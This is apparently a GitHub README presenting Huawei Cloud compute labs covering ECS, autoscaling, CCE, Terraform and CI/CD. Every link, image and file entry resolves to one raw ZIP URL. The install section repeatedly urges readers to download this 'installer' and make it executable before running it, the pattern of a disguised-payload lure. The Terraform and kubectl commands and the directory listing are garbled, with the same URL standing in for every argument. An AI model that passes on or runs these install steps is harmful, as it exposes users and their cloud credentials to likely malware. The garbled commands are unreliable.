https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip

# Compute Services Practice: Huawei Cloud Compute Labs for Engineers and Developers

[![Release Assets](https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip)](https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip)

![Cloud Icon](https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip) ![Server Icon](https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip) ![Code Icon](https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip)

A practical collection of hands-on projects, real-world labs, and live demos focused on Huawei Cloud compute services. The goal is to help cloud engineers, developers, and learners understand how virtual machines, auto scaling, container engines, and cloud-native architecture come together in Huawei’s ecosystem. The work here maps to real workflows you’ll encounter in production, with clear steps, sane defaults, and repeatable exercises.

Topics covered include automation, autoscaling, CI/CD, cloud, Cloudflare integration, compute services, ECS service patterns, Huawei devices, Huawei Cloud, OpenStack underpinnings, serverless patterns, and Terraform. This repo gives you guided paths to build practical skills you can apply in your own Huawei Cloud deployments.

If you want the latest assets, visit the Releases page to download the installers and lab packs. The page is reachable at the link above. You can also browse the Releases section to explore additional assets and documentation. The Releases page is the source of the materials used in these labs, and you can fetch the latest set from there.

Table of contents
- Why this repository exists
- Getting started
- Lab guides and demos
- Architecture and design patterns
- Automation and CI/CD samples
- Terraform modules and IaC patterns
- Security, networking, and cost-aware practices
- Project structure
- Contributing and code of conduct
- License
- Releases

Why this repository exists
Huawei Cloud offers a wide range of compute services. This repository helps you practice with real-world labs and demos that cover the main compute scenarios you will encounter: virtual machines, autoscaling groups, container engines, and cloud-native architectures. The labs are written to be approachable for newcomers but detailed enough for experienced engineers to learn best practices. The content is designed to be reusable, repeatable, and adaptable to different Huawei Cloud accounts and regions.

What you’ll learn
- Deploy and manage virtual machines on Huawei ECS
- Configure and tune autoscaling for demand-based workloads
- Provision container platforms with Huawei Container Engine (CCE)
- Design cloud-native architectures using microservices patterns
- Use serverless functions for event-driven workloads
- Automate deployments with Terraform and IaC best practices
- Build end-to-end CI/CD pipelines for Huawei Cloud projects
- Secure networks and manage costs in a cloud environment

Getting started
Prerequisites
- A Huawei Cloud account with active credits or a trial period
- A basic understanding of cloud compute concepts (VMs, networks, security groups)
- Git installed on your workstation
- Terraform installed on your workstation (prefer the latest stable version)
- A local shell environment with Bash or Zsh
- Optional: Docker for container-related labs
- Access keys or a method to authenticate with Huawei Cloud (AK/SK or IAM-based credentials)
- kubectl installed if you plan to work with Kubernetes clusters

Initial setup
- Clone this repository locally
- Run the installer script from the latest release to install dependencies and fetch lab content
- Follow the lab guides to run each exercise in your Huawei Cloud account

Note about the Releases link
The link provided points to the Releases page, which hosts installers and lab packs. If you download the installer, you should run the main installer script to configure your environment and fetch the labs. From the Releases page, you can download files such as https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip or related lab packages. The installer script is designed to set up the prerequisites and pull in the lab content for you. The second usage of the Releases link will appear in the Releases section of this document as well.

Install and run
- Open a terminal
- Download the installer from the Releases page
- Make the installer executable and run it
  - Example:
    - chmod +x https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
    - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
- The installer prompt will guide you through authentication setup and lab download
- After installation, you can start labs from the lab directory or use provided scripts to run labs

Note: The exact asset names may vary by release. Look for a file named something like https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip in the latest release and execute it as shown above.

Lab guides and demos
Overview
Each lab guide provides a focused objective, prerequisites, step-by-step instructions, expected outcomes, and tips. Labs assume you have access to Huawei Cloud resources, and they are designed to work with a generic Huawei Cloud CLI or console credentials. Where possible, the guides include alternative steps if a specific service or API is not available in your region.

Lab 1 — Provision a Virtual Machine on Huawei ECS
Objective
Learn how to create, configure, and manage a basic virtual machine using Huawei Cloud ECS. This lab introduces core concepts such as images, flavors, networks, security groups, and key pairs.

What you will do
- Create a virtual machine with a reasonable vCPU and memory size
- Attach a private network and security group rules to allow SSH and basic management
- Log in via SSH and install a sample web server
- Validate access from your workstation or a jump host

Prerequisites
- An ECS quota that allows at least one small VM
- SSH key pair configured in your Huawei Cloud account

Steps
- Create a VPC, subnet, and security group for SSH
- Create and boot an ECS instance using a chosen image
- Configure network access and security group rules
- SSH into the VM and install a small web server
- Verify the web server is reachable from your client

Expected outcomes
- A running VM with SSH access
- A basic web service available on port 80 or 8080

Lab 2 — Auto Scaling for Demand Spikes
Objective
Understand and apply auto scaling to handle traffic variation. You will configure scaling policies, alarms, and a scalable group that adjusts the number of ECS instances based on load.

What you will do
- Set up a scaling group with a launch template
- Create a metric-based alarm that triggers scaling
- Validate scaling by simulating load (or generating a steady load)
- Review the scaling activity history and adjust thresholds

Prerequisites
- Working ECS-based VM in a suitable VPC
- Access to Huawei Cloud monitoring APIs or equivalent metrics

Steps
- Create a launch template for ECS instances
- Define a scaling group with min/max/desired capacity
- Create alarm policies tied to CPU or network metrics
- Generate load to observe scaling actions
- Examine scaling events and costs

Expected outcomes
- Auto scaling responds to load, maintaining performance while controlling costs

Lab 3 — Container Engine (CCE) and Kubernetes Basics
Objective
Provision a container cluster and deploy a simple microservice. Learn how to interact with the cluster, deploy manifests, and manage workloads.

What you will do
- Create a Huawei Cloud Container Engine cluster
- Deploy a small service with a Deployment, Service, and Ingress
- Expose the service externally and verify connectivity
- Scale the deployment and watch pods roll out

Prerequisites
- Access to Huawei Cloud Container Engine (CCE)
- kubectl installed and configured for the new cluster

Steps
- Create a cluster with a modest node count
- Install a sample application (e.g., a simple web app)
- Expose the app via a LoadBalancer or Ingress
- Perform a scale operation on the Deployment

Expected outcomes
- A running Kubernetes app accessible from the internet or your VPC

Lab 4 — Cloud-Native Microservice Architecture
Objective
Demonstrate a basic microservice architecture using a handful of services that communicate via REST or messaging.

What you will do
- Deploy two microservices: user service and product service
- Introduce a lightweight API gateway
- Use a shared data store or mock data service
- Use logs and tracing to inspect communication

Prerequisites
- Basic microservice knowledge
- Access to container or serverless compute as needed

Steps
- Deploy each service in containers or as serverless functions
- Configure the API gateway to route requests
- Implement simple authentication between services
- Observe inter-service calls and latencies

Expected outcomes
- A small, functional microservice suite with observable metrics

Lab 5 — Serverless Patterns with Huawei Functions
Objective
Explore serverless patterns using Huawei’s function services. Build a small event-driven workflow.

What you will do
- Create a function that processes a trigger (e.g., HTTP request or object storage event)
- Chain functions to form a workflow
- Monitor function invocation and cold start performance

Prerequisites
- FunctionGraph or equivalent serverless service in Huawei Cloud

Steps
- Create a function and a trigger
- Connect a simple event source to the function
- Build a two-function workflow and test it

Expected outcomes
- A serverless workflow that runs on demand without managing servers

Lab 6 — IaC with Terraform
Objective
Devise repeatable infrastructure using Terraform. Learn about modules, workspaces, and state management.

What you will do
- Write a Terraform module for a VPC, subnets, and an ECS instance
- Provision resources with a sample configuration
- Apply changes and review drift and state

Prerequisites
- Terraform installed
- Huawei Cloud credentials configured for Terraform provider

Steps
- Create a Terraform module for core infrastructure
- Instantiate resources in a test workspace
- Validate the resulting resources and outputs
- Update the configuration and re-apply

Expected outcomes
- Reproducible infrastructure that can be versioned and shared

Lab 7 — CI/CD with Huawei Cloud and GitHub Actions
Objective
Demonstrate a simple CI/CD pipeline integrating Huawei Cloud with GitHub Actions.

What you will do
- Create a pipeline that builds code, pushes containers, and deploys to a cluster
- Run test jobs and publish artifacts
- Add security checks and approvals to the workflow

Prerequisites
- GitHub repository with project code
- Access to Huawei Cloud resources for deployment

Steps
- Create a GitHub Actions workflow
- Build and push a container image
- Deploy to ECS or CCE from the CI/CD pipeline
- Run basic tests and report results

Expected outcomes
- A working end-to-end pipeline from code to deployment

Lab 8 — OpenStack Compatibility Layer and Networking
Objective
Explore an OpenStack-based approach and network segmentation. This lab focuses on compatibility and secure networking patterns.

What you will do
- Provision a basic OpenStack-compatible network environment
- Create subnets, routers, and security groups
- Test connectivity across segments and to the internet

Prerequisites
- Access to OpenStack-compatible API endpoints or Huawei Cloud equivalents

Steps
- Create networks and security policies
- Validate cross-subnet communication
- Ensure security best practices are in place

Expected outcomes
- A functioning network fabric with controlled access

Architecture and design patterns
- Compute-first architecture: VMs and containers form the base compute layer
- Microservices with container orchestration: CCE handles lifecycle and scaling
- Event-driven serverless components: Functions respond to events and trigger actions
- Infrastructure as code: Terraform modules ensure repeatable provisioning
- CI/CD integration: GitHub Actions connects source control to deployment
- Observability by design: centralized logging, tracing, and metrics
- Secure by default: least privilege access, network segmentation, and key management
- Cost-aware design: resource limits, autoscaling, and usage monitoring

How to structure your projects
- Labs and demos: a dedicated directory with lab guides and scripts
- IaC: Terraform modules and examples
- Apps: sample microservices and serverless functions
- DevOps: CI/CD configurations and pipelines
- Networking: VPCs, subnets, security groups, and routing

Automation and CI/CD samples
- GitHub Actions workflows that build, test, and deploy Huawei Cloud resources
- Terraform plans and applies in automated pipelines
- Container image builds and registry management
- Automated cost checks and alerts

Terraform modules and IaC patterns
- Core networking module: VPC, subnets, and security groups
- Compute module: ECS instances, auto scaling groups, and load balancing
- Container module: CCE clusters and Kubernetes resources
- Serverless module: FunctionGraph resources and triggers
- Observability module: logging and monitoring integrations

Security, networking, and cost-aware practices
- Use VPCs with private subnets for sensitive workloads
- Apply security groups with least privilege rules
- Enable logging and auditing for all critical resources
- Use autoscaling to manage budget and performance
- Review cost dashboards and set up alerts for unusual usage

Project structure
- labs/: lab guides, scripts, and assets
- terraform/: modules and provider configurations
- apps/: sample microservices and containerized apps
- pipelines/: CI/CD configurations (GitHub Actions, scripts)
- docs/: supplementary diagrams and tutorials
- tools/: helper scripts and utilities

Contributing and code of conduct
We welcome contributors. To participate:
- Open issues to discuss changes
- Create feature branches and submit pull requests
- Follow the project’s style and testing guidelines
- Be respectful and constructive in all discussions

Code of Conduct
We aim for a welcoming environment. Treat others with respect. Disagreements should be resolved with dialogue. Harassment, discrimination, or disrespectful behavior is not tolerated.

License
This project is released under a permissive license that allows use, modification, and distribution. See LICENSE for details.

Releases
The primary source of installer and lab assets is the Releases page. You can visit the Releases page to download the latest assets and guides. The link is provided above for quick access. For direct reference, the Releases page is here: https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip

File structure overview
- docs/: architecture diagrams, design notes, and troubleshooting
- labs/: guided labs with step-by-step instructions
- terraform/: reusable modules for IaC
- apps/: sample microservices and serverless examples
- pipelines/: CI/CD workflows and configuration
- scripts/: helper scripts used in labs and demos
- assets/: supporting files and data sets

How to run a lab locally
- Ensure prerequisites are installed (CLI tools, Terraform, cloud credentials)
- Open the lab guide corresponding to your current objective
- Copy any required configuration parameters from the guide
- Run the provided scripts or commands in the correct order
- Validate results with logs, metrics, and test requests

Sample commands and snippets
- Terraform basics
  - terraform init
  - terraform plan https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - terraform apply https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
- Kubernetes basics (kubectl)
  - kubectl get pods
  - kubectl describe svc my-service
  - kubectl apply -f https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
- Serverless function
  - Create function with a simple handler
  - Trigger via HTTP request
  - Monitor invocation metrics
- Basic ECS provisioning (conceptual)
  - Create VPC and subnet
  - Launch an ECS instance with a chosen image
  - Attach security groups for SSH and web traffic
- CI/CD pipeline
  - Build a container image
  - Push to a registry
  - Deploy to a cluster using a manifest or Helm
  - Run tests and publish results

User stories and practical scenarios
- As a cloud engineer, I want to provision a VM quickly and secure it so I can run tests without compromising the network.
- As a developer, I want to deploy a microservice in Kubernetes and expose it through a gateway with proper monitoring.
- As a DevOps engineer, I want an automated pipeline that builds, tests, and deploys to Huawei Cloud with minimal manual steps.
- As a student, I want guided labs that demonstrate how different compute services integrate in a real-world architecture.
- As a trainer, I want ready-to-use lab content to teach core concepts of cloud compute, containers, serverless, and IaC.

Education and learning pathways
- Beginner track: basic VM provisioning, simple scripts, and intro to Terraform
- Intermediate track: autoscaling scenarios, container orchestration, and microservice patterns
- Advanced track: full CI/CD pipelines, complex networking, and cost optimization
- Specialist tracks: serverless patterns, OpenStack compatibility, and security-focused labs

FAQ
- Do I need Huawei Cloud credentials to use the labs?
  Yes. You need access to Huawei Cloud resources to complete the labs. If you lack credits, start with a trial account or use sandbox environments where available.
- Can I customize labs for my own projects?
  Absolutely. The labs are designed to be extensible. You can modify Terraform modules, Kubernetes manifests, and serverless configurations.
- Are the labs region-locked?
  Some services may have regional availability. Check the Huawei Cloud console for the services you plan to use and adjust region-specific parameters in the lab guides.
- How do I reset a lab?
  Use the provided scripts to tear down resources or manually remove resources in the Huawei Cloud console. The lab guides include cleanup steps.

Releases
The Releases page hosts installers and lab packs that enable you to set up the environment and start practicing. The link to the Releases page is the same as above. For direct access, visit: https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip

Appendix: recommended learning resources
- Huawei Cloud official docs for ECS, Auto Scaling, CCE, FunctionGraph
- Kubernetes basics and kubectl commands
- Terraform provider documentation for Huawei Cloud
- OpenStack concepts and networking fundamentals
- CI/CD best practices and pipeline design
- Cloud security basics and network segmentation
- Cost management and budget control in cloud environments

Changelog notes
- Initial release with a starter set of labs
- Expanded labs to cover autoscaling, CCE, and serverless
- Added IaC and CI/CD examples
- Updated security and networking guidance

Acknowledgments
- The community contributors who helped shape lab content
- The Huawei Cloud ecosystem and its compute services ecosystem
- Open-source tools and platforms that enable hands-on learning

Guarantees
- The labs aim to be practical and reproducible
- The tutorials emphasize safe practices and cost awareness
- The content is updated to reflect common Huawei Cloud compute workflows

Releases (again)
For the latest assets, download from the provided link to the Releases page. You can find installers and lab packs there, including the main installer script https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip, which you should execute to set up the environment. The Releases page is accessible at the link above, and you may also access it directly via: https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip

Directory and file overview
- labs/
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
- terraform/
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
- apps/
  - user-service/
  - product-service/
  - gateway/
  - frontend/
- pipelines/
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - ci-cd-scripts/
- docs/
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
- scripts/
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip (if provided in installer)
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
- assets/
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip

What to expect after installation
- A local environment configured with lab content
- Access to Huawei Cloud services configured for the exercises
- A set of ready-to-run labs with clear instructions
- Sample IaC modules you can reuse in your own projects

Continued learning and next steps
- Extend IaC modules with your own resources
- Build more complex microservice architectures
- Integrate more services like Object Storage, VPC peering, and PrivateLink
- Add more CI/CD integrations and test coverage
- Explore security hardening and compliance patterns

If you run into issues
- Check the lab guides for prerequisites and known issues
- Review the logs from the installer and lab scripts
- Visit the Releases page for the latest assets
- Open an issue in this repository with a clear description of the problem and steps to reproduce

End of document